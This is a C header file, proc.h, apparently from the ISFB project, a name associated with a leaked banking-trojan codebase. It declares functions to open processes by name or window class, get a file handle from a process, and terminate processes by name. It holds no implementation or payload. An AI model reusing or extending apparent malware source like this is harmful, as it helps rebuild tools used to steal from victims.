//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: proc.h
// $Revision: 39 $
// $Date: 2013-03-19 18:02:34 +0300 (Вт, 19 мар 2013) $
// description:
//	CRM client dll. Processes manipulation functions. 

HANDLE ProcOpenProcessByNameW( PWSTR ProcessName, DWORD dwDesiredAccess );
HANDLE ProcOpenProcessByNameA( PSTR ProcessName, DWORD dwDesiredAccess );
HANDLE ProcFileHandleFromProcess( HANDLE hProcess, LPWSTR FullFileName );
HANDLE ProcOpenProcessByWindow( LPWSTR WindowClass, DWORD Access );

WINERROR ProcTerminateProcessW( LPWSTR ProcessName );
WINERROR ProcTerminateProcessA( LPSTR ProcessName );